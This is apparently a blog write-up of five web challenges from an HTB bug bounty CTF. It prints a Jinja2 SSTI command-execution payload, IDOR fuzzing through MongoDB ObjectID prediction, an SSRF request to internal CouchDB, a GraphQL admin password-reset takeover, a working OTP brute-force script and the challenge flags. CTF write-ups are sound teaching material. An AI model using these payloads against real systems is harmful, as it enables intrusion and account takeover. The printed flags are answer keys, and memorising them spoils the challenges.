---
title: Hack the System - Bug Bounty CTF
date: 2025-06-29
tags: [htb, bugbounty, ctf, web, ssti, idor, ssrf, graphql, jwt, mongodb, expose hidden endpoints, prototype pollution, json escaping, mermaid]
categories: [CTF Writeups, Bug Bounty, HTB Writeups]
author: 2Fa0n
img_path: /assets/img/hack-the-system-bug-bounty-ctf
image: /assets/img/hack-the-system-bug-bounty-ctf/hack-the-system-bug-bounty-ctf_banner.png
---

# Web
## JinjaCare
**Solvers:** xxx <br>
**Author:** Hack the System

### Description
Jinjacare is a web application designed to help citizens manage and access their COVID-19 vaccination records. The platform allows users to store their vaccination history and generate digital certificates. They've asked you to hunt for any potential security issues in their application and retrieve the flag stored in their site.

**Related Bug Bounty Reports:** <br>
*Bug Report #1* - [RCE via SSTI](https://hackerone.com/reports/125980) <br>
*Bug Report #2* - [SSTI](https://hackerone.com/reports/1104349)

### Solution
After reading 2 bug reports, I found out that these are triggered via profile name and when email receive, they will be SSTI. <br>
&rarr; Let's start the docker and see what we got.

![JinjaCare](/assets/img/hack-the-system-bug-bounty-ctf/web_jinja-care.png)

This website is used for monitoring Covid-19 vaccination records and vaccination certificate. <br>
&rarr; Let's register a new account.

![JinjaCare](/assets/img/hack-the-system-bug-bounty-ctf/web_jinja-care_register.png)

![JinjaCare](/assets/img/hack-the-system-bug-bounty-ctf/web_jinja-care_login.png)

![JinjaCare](/assets/img/hack-the-system-bug-bounty-ctf/web_jinja-care_dashboard.png)

After login, we can see dashboard contain Profile Management, Medical History, Vaccination Records, and even can download certificate. <br>
&rarr; Let's try to download certificate.

![JinjaCare](/assets/img/hack-the-system-bug-bounty-ctf/web_jinja-care_download.png)

We can see that the certificate got `Name`, `Vaccination Status`, `Date of Issue`. <br>
&rarr; What if we can change the `test` to `{{7*7}}`?

![JinjaCare](/assets/img/hack-the-system-bug-bounty-ctf/web_jinja-care_ssti.png)

![JinjaCare](/assets/img/hack-the-system-bug-bounty-ctf/web_jinja-care_ssti_2.png)

See that `test 49` is printed. <br>
&rarr; Now let's read the flag by using [Jinja2 SSTI](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#jinja2-remote-code-execution) to execute command.

```bash
{{config.__class__.__init__.__globals__['os'].popen('ls /').read()}}
```

![JinjaCare](/assets/img/hack-the-system-bug-bounty-ctf/web_jinja-care_ssti_3.png)

Found out there is a `flag.txt` file. <br>
&rarr; Let's read the flag.

```bash
{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}
```

![JinjaCare](/assets/img/hack-the-system-bug-bounty-ctf/web_jinja-care_ssti_4.png)

Grab the flag.

**Flag:** `HTB{v3ry_e4sy_sst1_r1ght?_8d7833f4dd274cc7674b323d798ddb66}`

## NeoVault
**Solvers:** xxx <br>
**Author:** Hack the System

### Description
Neovault is a trusted banking application that allows users to effortlessly transfer funds to one another and conveniently download their transaction history. We invite you to explore the application for any potential vulnerabilities and uncover the flag hidden within its depths.

**Related Bug Bounty Reports:** <br>
*Bug Report #1* - [Mongo Object ID Prediction](https://techkranti.com/idor-through-mongodb-object-ids-prediction/) <br>
*Bug Report #2* - [IDOR](https://hackerone.com/reports/1464168)

### Solution
For this one, we gonna try to exploit IDOR by using script to generate monogodb object ids prediction to see if we can access or even see other user's transaction history.

![NeoVault](/assets/img/hack-the-system-bug-bounty-ctf/web_neovault.png)

So this website just a banking application. <br>
&rarr; Let's grab a new account.

![NeoVault](/assets/img/hack-the-system-bug-bounty-ctf/web_neovault_register.png)

![NeoVault](/assets/img/hack-the-system-bug-bounty-ctf/web_neovault_login.png)

![NeoVault](/assets/img/hack-the-system-bug-bounty-ctf/web_neovault_dashboard.png)

As we can see the dashboard, we also got $100 from `neo_system` account. <br>
When checking burp suite, we can see our mongo object id from `/api/v2/auth/me` request.

![NeoVault](/assets/img/hack-the-system-bug-bounty-ctf/web_neovault_burp_suite.png)

So far we know the object id from ourself and `neo_system` account. <br>
&rarr; Gonna use [mongo-objectid-predict](https://github.com/andresriancho/mongo-objectid-predict) to generate the object id so we can use these prediction to fuzz via transfer money from ourself to other user, if our transaction is successful, we can see the object id and even that user name.

First I will generate the object id prediction to a file.

```bash
python2 mongo-objectid-predict 6860047dcad9555961c1a248 > mongo_objectid_predict.txt
```

Then just make a simple transfer money from ourself to `neo_system` as the two account that we know. <br>
After that, check this request `/api/v2/transactions` and intercept and send it to intruder. <br>

![NeoVault](/assets/img/hack-the-system-bug-bounty-ctf/web_neovault_burp_suite_2.png)

Use Sniper Attack and then add the `mongo_objectid_predict.txt` to the payload.

```json
{
    "toUserId":"$6860047dcad9555961c1a248$","amount":1,"description":"hello","category":"Food"
}
```

Add the `$` to that object id. <br>
When start attacking, check the status code and see if there is `201`, it means we have make another transaction to other user based on our predict object id. <br>

![NeoVault](/assets/img/hack-the-system-bug-bounty-ctf/web_neovault_burp_suite_3.png)

Checking back the transaction history, we can see that we have make a transaction to `user_with_flag` account.

![NeoVault](/assets/img/hack-the-system-bug-bounty-ctf/web_neovault_burp_suite_4.png)

Now let's download again the transaction history by modify this request `/api/v2/transactions/download-transactions` and change `v2` to `v1`. <br>
Then add the id belong to `user_with_flag` account.

```json
{
    "_id":"68600499cad9555961c1a256"
}
```

![NeoVault](/assets/img/hack-the-system-bug-bounty-ctf/web_neovault_burp_suite_5.png)

BOOM! Nail the flag.

**Flag:** `HTB{n0t_s0_3asy_1d0r_c7dcad13ef6103ab7dcdb9adc52e3a9c}`

## CitiSmart
**Solvers:** xxx <br>
**Author:** Hack the System

### Description
Citismart is an innovative Smart City monitoring platform aimed at detecting anomalies in public sector operations. We invite you to explore the application for any potential vulnerabilities and uncover the hidden flag within its depths.

**Related Bug Bounty Reports:** <br>
*Bug Report #1* - [Expose Hidden Endpoints](https://infosecwriteups.com/javascript-enumeration-for-bug-bounties-expose-hidden-endpoints-secrets-like-a-pro-418c2aec318f) <br>
*Bug Report #2* - [SSRF](https://cyberweapons.medium.com/internal-port-scanning-via-ssrf-eb248ae6fa7b)

### Solution
So this bug is gonna related to some hidden endpoints and SSRF inside this website. <br>
&rarr; Let's start the docker and see what we got.

![CitiSmart](/assets/img/hack-the-system-bug-bounty-ctf/web_citismart.png)

This website is used for monitoring public sector operations. <br>
&rarr; Let's try to register a new account.

![CitiSmart](/assets/img/hack-the-system-bug-bounty-ctf/web_citismart_register.png)

We can see that we can not register a new account, only login. <br>
&rarr; Let's try randomly login.

![CitiSmart](/assets/img/hack-the-system-bug-bounty-ctf/web_citismart_login.png)

Checking burp suite, we can see that there is a `JWT` token in the response. <br>

![CitiSmart](/assets/img/hack-the-system-bug-bounty-ctf/web_citismart_login_2.png)
&rarr; Let's fuzz the hidden endpoints cause we need to find way to access inside this website.

After using [dirsearch](https://github.com/maurosoria/dirsearch), we found `/dashboard` endpoint. <br>
&rarr; Let's access it without login.

![CitiSmart](/assets/img/hack-the-system-bug-bounty-ctf/web_citismart_dashboard.png)

Got into the dashboard, the reason may be we login failed but website prodive us token so we can leverage this to access the dashboard straightfoward. <br>
Also we can add other endpoint to monitor.

![CitiSmart](/assets/img/hack-the-system-bug-bounty-ctf/web_citismart_dashboard_2.png)

Let's add random endpoint to monitor and grab the request. <br>
Up to this point, we can assume that there will be some kind of SSRF inside this website. <br>
&rarr; If we check again, these endpoint which being monitored has a specific port, so what if we can port fuzzing through intruder, there may be chance to find other port.

![CitiSmart](/assets/img/hack-the-system-bug-bounty-ctf/web_citismart_fuzz.png)

The reason adding `#` after port to push state of the application to the client, it just like bookmark the current state of the application.

![CitiSmart](/assets/img/hack-the-system-bug-bounty-ctf/web_citismart_fuzz_2.png)

Found out 4 ports: `80`, `3000`, `5984` and `5986`. <br>
Check the response from this request `/api/dashboard/metrics`.

![CitiSmart](/assets/img/hack-the-system-bug-bounty-ctf/web_citismart_fuzz_3.png)

Found out there is port `5984` so checking google and this is a `CouchDB` which is an open-source NoSQL database management system. <br>
We can also see the response got `CouchDB` in the response. <br>
&rarr; Let's grab the flag from this database by modify this request `/api/dashboard/endpoints`.

```json
{
    "url":"http://127.0.0.1:5984/citismart/FLAG#",
    "sector":"abc"
}
```

The reason for getting `citismart` and `FLAG` is guessing based on what we have.

![CitiSmart](/assets/img/hack-the-system-bug-bounty-ctf/web_citismart_fuzz_4.png)

Nailed the flag.

**Flag:** `HTB{sm4rt_cit1_but_n0t_s3cur3_32712ac229e16cdbad6d2ecf0239dda3}`

## SpeedNet
**Solvers:** xxx <br>
**Author:** Hack the System

### Description
Speednet is an Internet Service Provider platform that enables users to purchase internet services. We invite you to participate in our bug bounty program to identify any potential vulnerabilities within the application and retrieve the flag hidden on the site. For your testing, we have provided additional email services.

Please find the details below: <br>
Email Site: `http://IP:PORT/emails/` <br>
Email Address: `test@email.htb`

**Related Bug Bounty Reports:** <br>
*Bug Report #1* - [Graphql Batching](https://hackerone.com/reports/2166697) <br>
*Bug Report #2* - [Graphql Introspection](https://infosecwriteups.com/1000-bug-using-simple-graphql-introspection-query-b68da8260877) <br>
*Bug Report #3* - [Alias-based Query Batching](https://inigo.io/blog/defeating_controls_with_alias-based_query_batching) <br>
*Bug Report #4* - [Hacking Graphql Endpoints](https://www.yeswehack.com/learn-bug-bounty/hacking-graphql-endpoints)

### Solution
Brief about this challenge is we gonna register a new account with `test@email.htb` and then login will need to has otp which we can get it from email site provided. <br>
After reading those bug reports, the way to exploit this challenge is we gonna see the `admin@speednet.htb` from our userProfile. <br>
Then we gonna forgot and reset password for `admin@speednet.htb` with devForgotPassword to grab the token. <br>
When success change admin password, it will prompt to otp, resend the otp and intercept that request and craft a python script to brutefore to get that otp. <br>
Able to login and grab the `JWT token` from admin and Graphql from the invoicehistory to get flag.

**Here is the step by step:**

- First just register a new account and login.

- Then modify `userId` in the `POST graphql` to `1` so we can able to see the `admin@speednet.htb`.

![SpeedNet](/assets/img/hack-the-system-bug-bounty-ctf/web_speednet_graphql.png)

- Then abusing the graphql introspection to retrieve full schema better for latter step.

```json
{
    "query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}} "
}
```

- Now let's forgot and reset password for `admin@speednet.htb` with devForgotPassword to grab the token.

```json
{
    "query":"\n    mutation devForgotPassword($email: String!) {\n      devForgotPassword(email: $email)\n    }\n  ",
    "variables":{"email":"admin@speednet.htb"}
}
```

```json
{
    "data":{
        "devForgotPassword":"Dev only! Password reset token: 1ec87901-f818-4374-bc35-b43e3dafca54"
    }
}
```

- Change the admin password with the token we got.

```json
{
    "query": "mutation resetPassword($token: String!, $newPassword: String!) {\n  resetPassword(token: $token, newPassword: $newPassword)\n}",
    "variables": {
        "token": "1ec87901-f818-4374-bc35-b43e3dafca54",
        "newPassword": "pass@123"
    }
}
```

```json
{
    "data":{
        "resetPassword":"Password has been reset successfully"
    }
}
```

- When we login to admin, it will prompt to otp, then we will resend otp and then intercept that request to grab the token from this request, and using bruteforce craft script to get match otp.

```python
import requests
import json
import time

URL = "http://IP:PORT/graphql"
TOKEN = "<grab it when intercept the resend OTP request in admin login>"
BATCH_SIZE = 100

def send_batch(start, end):
    queries = []
    for i in range(start, end + 1):
        otp = str(i).zfill(4)
        queries.append({
            "query": """
                mutation VerifyTwoFactor($token: String!, $otp: String!) {
                  verifyTwoFactor(token: $token, otp: $otp) {
                    token
                    user { id email }
                  }
                }
            """,
            "variables": {
                "token": TOKEN,
                "otp": otp
            }
        })

    headers = {
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(URL, json=queries, headers=headers, timeout=10)
        try:
            result = response.json()
        except json.JSONDecodeError:
            print(f"[!] JSON error. Status {response.status_code}. Body:\n{response.text}")
            return False

        for r in result:
            if "data" in r and r["data"].get("verifyTwoFactor"):
                print("[+] SUCCESS!")
                print(json.dumps(r["data"]["verifyTwoFactor"], indent=2))
                return True
        return False

    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
        return False

# Brute loop
for i in range(1000, 10000, BATCH_SIZE):
    print(f"[*] Trying {i} to {min(i + BATCH_SIZE - 1, 9999)}")
    success = send_batch(i, min(i + BATCH_SIZE - 1, 9999))
    if success:
        break
    time.sleep(1.5)
```

- Now we have the `JWT token` from admin, we can use this to get the flag from the invoicehistory.

```json
{
    "query":"
    query { invoiceHistory(limit:10) { id number amount status dueDate } }"
}
```

![SpeedNet](/assets/img/hack-the-system-bug-bounty-ctf/web_speednet_graphql_2.png)

Grab the flag.

**Flag:** `HTB{gr4phql_3xpl01t_1n_a_nutsh3ll_47afd474aef836364036af0e25d9daa1}`

## Sattrack
**Solvers:** xxx <br>
**Author:** Hack the System

### Description
Welcome to the Sattrack Bug Bounty Invitational for Authorized Users! Sattrack is a premier platform dedicated to monitoring satellite data, exclusively available to our selected authorized partners. We invite you to participate in our limited bug bounty program, aimed at identifying and addressing any security vulnerabilities within our application. Your contributions are invaluable in helping us maintain the integrity and security of our services. <br>
You may use `partner@rockyou.xyz:partn3r123` as a valid credentials. <br>
To ensure optimal site performance, we have established a dedicated support page at `/report`. Here, you can submit the URLs of any issues (non-security related) you encounter, and our admin team will promptly investigate and provide assistance.

**Related Bug Bounty Reports:** <br>
*Bug Report #1* - [Mermaid Prototype Pollution](https://hackerone.com/reports/1106238) <br>
*Bug Report #2* - [Prototype Pollution](https://hackerone.com/reports/998398) <br>
*Bug Report #3* - [JSON Escaping](https://infosecwriteups.com/json-escaping-out-in-the-wild-the-10-minutes-xss-70db21fb6c6e)

### Solution
For this flag, I got support to get this flag and also due to the time limit, so I can not able to reproduce again the process, *sorry for this inconvenience.*

**Flag:** `HTB{cl13nt_s1d3_pp_4r3_d4ng3r0us_76d61db79df11cfc847048c16b026607}`

*PS: I found out a blog writeup written about this challenge [Sattrack](https://blog.whale-tw.com/2025/06/30/2025-bugbountyctf/#Sattrack) from [@whale-tw](https://blog.whale-tw.com/). Big shout out to him.*

![result](/assets/img/hack-the-system-bug-bounty-ctf/result.png)